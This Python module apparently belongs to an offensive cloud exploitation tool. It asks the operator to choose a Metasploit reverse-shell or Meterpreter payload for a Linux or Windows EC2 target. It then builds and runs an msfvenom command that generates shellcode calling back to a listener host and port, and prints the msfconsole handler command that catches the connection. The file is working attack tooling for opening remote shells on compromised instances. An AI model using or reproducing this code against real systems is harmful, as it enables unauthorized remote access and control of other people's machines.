import os

from clint.textui import prompt

from src.helpers.print_output import print_color


# noinspection SpellCheckingInspection
def metasploit_installed_options(host: str, port: str, system_name: str) -> str:
    """
    Prompts for metasploit options against an EC2 instance depending on its OS.
    :param host: IP or hostname of the listening server running metasploit exploit handler.
    :param port: The port the exploit handler is listening on.
    :param system_name: The OS of the target instance
    :return: Metasploit payloads
    """
    print_color(
        '[*] Choose your metasploit payload. This requires msfvenom to be installed in your system.')

    linux_tcp_meterpreterx64 = 'python/meterpreter/reverse_tcp'
    linux_https_meterpreterx64 = 'python/meterpreter/reverse_https'
    linux_tcp_shell = 'python/shell_reverse_tcp'
    windows_tcp_meterpreterx64 = 'windows/x64/meterpreter/reverse_tcp'
    windows_https_meterpreterx64 = 'windows/x64/meterpreter/reverse_https'
    windows_tcp_shell = 'windows/x64/shell/reverse_tcp'

    if system_name == 'linux':
        shell_options = [
            {'selector': '1', 'prompt': 'Linux Meterpreter reverse TCP x64', 'return': linux_tcp_meterpreterx64},
            {'selector': '2', 'prompt': 'Linux Meterpreter reverse HTTPS x64',
             'return': linux_https_meterpreterx64},
            {'selector': '3', 'prompt': 'Linux TCP Shell', 'return': linux_tcp_shell}]
    else:
        shell_options = [
            {'selector': '1', 'prompt': 'Windows Meterpreter reverse TCP x64', 'return': windows_tcp_meterpreterx64},
            {'selector': '2', 'prompt': 'Windows Meterpreter reverse HTTPS x64',
             'return': windows_https_meterpreterx64},
            {'selector': '3', 'prompt': 'Windows TCP Shell', 'return': windows_tcp_shell}]

    payload = prompt.options('Payload:', shell_options)
    if system_name == 'linux':
        msf_shell = 'msfvenom -p %s LHOST=%s LPORT=%s -f raw --smallest' % (
            payload, host, port)
    else:
        msf_shell = 'msfvenom -p %s LHOST=%s LPORT=%s --f psh-net --smallest' % (
            payload, host, port)

    print_color('[*] Run the following command on your reverse server running the handler:')
    msfconsole_cmd = "msfconsole -x 'use exploit/multi/handler; set LHOST %s; set lport %s; set payload %s;run -j;'" % (
        host, port, payload)
    print_color(msfconsole_cmd, 'magenta')

    shellcode = os.popen(msf_shell).read()
    if system_name == 'linux':
        shellcode = "python -c \"%s\"" % shellcode

    return shellcode
